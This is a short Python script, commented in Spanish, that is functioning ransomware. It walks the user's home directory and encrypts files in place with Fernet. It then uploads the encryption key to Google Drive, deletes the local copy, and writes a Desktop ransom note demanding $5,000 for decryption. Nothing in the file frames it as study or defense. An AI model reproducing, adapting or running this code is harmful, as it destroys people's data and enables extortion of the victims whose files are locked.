# proceso v2

import os
import json
import hashlib
from cryptography.fernet import Fernet
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from google_auth_oauthlib.flow import InstalledAppFlow

# --- Configuración ---
EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json', 'token.json', 'client_secret.json']
SCOPES = ['https://www.googleapis.com/auth/drive.file']

# --- Inserta aquí el contenido de tu credentials.json como diccionario ---
CREDENTIALS_DICT = {
    "installed": {
        "client_id": "TU_CLIENT_ID",
        "project_id": "TU_PROJECT_ID",
        "auth_uri": "https://accounts.google.com/o/oauth2/auth",
        "token_uri": "https://oauth2.googleapis.com/token",
        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
        "client_secret": "TU_CLIENT_SECRET",
        "redirect_uris": ["urn:ietf:wg:oauth:2.0:oob", "http://localhost"]
    }
}

# --- Funciones ---
def generar_key(path="key.key"):
    key = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(key)
    return key

def calcular_hash(data):
    return hashlib.sha256(data).hexdigest()

def es_oculto(path):
    return any(p.startswith('.') for p in path.split(os.sep))

def encontrar_archivos(ruta_home, key_path, script_path):
    archivos = []
    for dirpath, _, filenames in os.walk(ruta_home):
        if es_oculto(dirpath):
            continue
        for nombre in filenames:
            full_path = os.path.join(dirpath, nombre)
            _, ext = os.path.splitext(nombre)
            if (
                ext.lower() in EXTENSIONES_PROHIBIDAS or
                full_path == key_path or
                full_path == script_path or
                nombre in ARCHIVOS_EXCLUIDOS
            ):
                continue
            archivos.append(full_path)
    return archivos

def encriptar_archivos(archivos, key):
    f = Fernet(key)
    hashes = {}
    for archivo in archivos:
        try:
            with open(archivo, "rb") as file:
                datos = file.read()
            hash_original = calcular_hash(datos)
            datos_encriptados = f.encrypt(datos)
            with open(archivo, "wb") as file:
                file.write(datos_encriptados)
            hashes[archivo] = hash_original
            print(f"✔ Encriptado: {archivo}")
        except Exception as e:
            print(f"✘ Error con {archivo}: {e}")
    return hashes

def autenticar():
    import tempfile
    with tempfile.NamedTemporaryFile('w+', delete=False) as cred_file:
        json.dump(CREDENTIALS_DICT, cred_file)
        cred_file_path = cred_file.name
    flow = InstalledAppFlow.from_client_secrets_file(cred_file_path, SCOPES)
    creds = flow.run_local_server(port=0)
    os.remove(cred_file_path)
    return creds

def subir_archivo(nombre_local, nombre_remoto):
    creds = autenticar()
    servicio = build('drive', 'v3', credentials=creds)
    archivo_metadata = {'name': nombre_remoto}
    media = MediaFileUpload(nombre_local, resumable=True)
    archivo = servicio.files().create(body=archivo_metadata, media_body=media, fields='id').execute()
    print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")

# --- Ejecución principal ---
if __name__ == "__main__":
    ruta_home = os.path.expanduser("~")
    key_path = os.path.realpath("key.key")
    script_path = os.path.realpath(__file__)

    if not os.path.exists("key.key"):
        key = generar_key()
    else:
        with open("key.key", "rb") as f:
            key = f.read()

    archivos = encontrar_archivos(ruta_home, key_path, script_path)
    hashes = encriptar_archivos(archivos, key)

    with open("hashes.json", "w") as f:
        json.dump(hashes, f)

    subir_archivo("key.key", "key.key")
    os.remove("key.key")

    # Crear archivo saludo.txt en el escritorio
    escritorio = os.path.join(ruta_home, "Desktop")
    with open(os.path.join(escritorio, "instrucciones_rescate.txt"), "w") as f:
        f.write("Hola. Tus archivos fueron encriptados. Para recuperarlos reposita $5.000 a la cuenta RUT 12.345-k para que te enviemos el programa y clave necesarios para desencriptar tus datos")

    print("\n[🔒] Encriptación completada y clave subida a Drive.")
